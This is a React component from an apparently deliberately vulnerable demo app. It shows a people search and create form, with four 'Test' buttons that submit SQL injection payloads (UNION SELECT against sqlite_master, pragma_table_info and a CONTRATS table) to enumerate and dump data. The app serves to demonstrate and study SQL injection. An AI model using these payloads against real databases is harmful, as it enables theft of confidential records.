import { Person } from "@bad-sec-app/shared";
import React, { useState } from "react";
import { useEffect } from "react";
import { Alert, Button, Container, Form, Table } from "react-bootstrap";
import { customFetch } from "../context/ajax";

const People = () => {
    const [searchErrMsg, setSearchErrMsg] = useState("");
    const [createMsg, setCreateMsg] = useState("");
    const [searchChanged, setSearchChanged] = useState<number>(0);
    const [search, setSearch] = useState<string>("");
    const [peopleData, setPeopleData] = useState<Person[]>([]);
    const [firstName, setFirstName] = useState("");
    const [lastName, setLastName] = useState("");
    const [age, setAge] = useState(0);
    const [photo, setPhoto] = useState("");
    const [debugMessage, setDebugMessage] = useState("");
    const handleRefresh = () => {
        setSearchChanged(searchChanged + 1);
    };
    const handleCreate = async () => {
        setSearchErrMsg("");
        setCreateMsg("");
        const data = await customFetch("/persons", {
            method: "POST",
            body: JSON.stringify({
                firstName: firstName,
                lastName: lastName,
                age: age,
                photoUrl: photo
            })
        }).catch((e) => {
            setCreateMsg(e?.message || "Error");
        });
        const [person, msg]: [unknown, string] = data;
        setDebugMessage(msg);
        console.log(person);
    };
    useEffect(() => {
        const getPersonnes = async (): Promise<void> => {
            let url = "/persons";
            if (search) {
                url = url + "?search=" + encodeURIComponent(search);
            }
            const data = await customFetch(url);
            setSearchErrMsg("");
            setPeopleData(data);
            return data;
        };
        getPersonnes().catch((e) => {
            setPeopleData([]);
            setSearchErrMsg(e?.message || "Error");
        });
        // eslint-disable-next-line react-hooks/exhaustive-deps
    }, [searchChanged]);
    useEffect(() => {
        setSearchErrMsg("");
        setCreateMsg("");
    }, [search, firstName, lastName, age, photo]);
    return (
        <Container className="m-auto mt-5">
            <div style={{ display: "none" }}>{debugMessage}</div>
            <Alert key="danger" variant="danger" className={searchErrMsg ? "" : "d-none"}>
                {searchErrMsg}
            </Alert>
            <h2>People</h2>
            <div className="row gy-1 gx-1 mb-2 align-items-start">
                <div className="col-auto">
                    <input
                        type="text"
                        className="form-control"
                        value={search}
                        onChange={(e) => setSearch((e.target as HTMLInputElement).value)}
                        id="search"
                        placeholder="Search"
                    />
                </div>
                <div className="col-auto">
                    <Button
                        variant="primary"
                        onClick={() => {
                            handleRefresh();
                        }}
                    >
                        Refresh
                    </Button>
                </div>
                <div className="col-auto">
                    <Button
                        variant="secondary"
                        onClick={() => {
                            setSearch(
                                "' UNION SELECT name FROM sqlite_master WHERE type='table' --"
                            );
                            handleRefresh();
                        }}
                    >
                        Test 1
                    </Button>
                </div>
                <div className="col-auto">
                    <Button
                        variant="secondary"
                        onClick={() => {
                            setSearch(
                                "' UNION SELECT name, name, 0 FROM sqlite_master WHERE type='table' --"
                            );
                            handleRefresh();
                        }}
                    >
                        Test 2
                    </Button>
                </div>
                <div className="col-auto">
                    <Button
                        variant="secondary"
                        onClick={() => {
                            setSearch(
                                "' UNION SELECT name, name, 0 FROM pragma_table_info('CONTRATS') --"
                            );
                            handleRefresh();
                        }}
                    >
                        Test 3
                    </Button>
                </div>
                <div className="col-auto">
                    <Button
                        variant="secondary"
                        onClick={() => {
                            setSearch("' UNION SELECT entreprise, sujet, montant FROM CONTRATS --");
                            handleRefresh();
                        }}
                    >
                        Test 4
                    </Button>
                </div>
            </div>
            <div>
                <Table striped bordered hover>
                    <thead>
                        <tr>
                            <th>First Name</th>
                            <th>Last Name</th>
                            <th>Age</th>
                            <th>Image</th>
                        </tr>
                    </thead>
                    <tbody>
                        {peopleData.map((data, index) => {
                            const img = data.photoUrl ? (
                                <img
                                    src={data.photoUrl}
                                    style={{ width: "52px", height: "56px" }}
                                />
                            ) : null;

                            return (
                                <tr key={index}>
                                    <td>{data.firstName}</td>
                                    <td>{data.lastName}</td>
                                    <td>{data.age}</td>
                                    <td>{img}</td>
                                </tr>
                            );
                        })}
                    </tbody>
                </Table>
            </div>
            <h2>Add a person</h2>
            <Form>
                <Form.Group className="mb-2" controlId="fn">
                    <Form.Control
                        type="text"
                        value={firstName}
                        onChange={(e) => setFirstName((e.target as HTMLInputElement).value)}
                        placeholder="First Name"
                    />
                </Form.Group>
                <Form.Group className="mb-2" controlId="ln">
                    <Form.Control
                        type="text"
                        value={lastName}
                        onChange={(e) => setLastName((e.target as HTMLInputElement).value)}
                        placeholder="Last name"
                    />
                </Form.Group>
                <Form.Group className="mb-2" controlId="Age">
                    <Form.Control
                        type="text"
                        value={age}
                        onChange={(e) => setAge(parseInt((e.target as HTMLInputElement).value, 10))}
                        placeholder="Age"
                    />
                </Form.Group>
                <Form.Group className="mb-2" controlId="photo">
                    <Form.Control
                        type="text"
                        value={photo}
                        onChange={(e) => setPhoto((e.target as HTMLInputElement).value)}
                        placeholder="Photo"
                    />
                </Form.Group>
                <Button
                    variant="primary"
                    onClick={async () => {
                        await handleCreate();
                    }}
                >
                    Add
                </Button>
                <Alert key="info" variant="info" className={createMsg ? "" : "d-none"}>
                    {createMsg}
                </Alert>
            </Form>
        </Container>
    );
};

export default People;
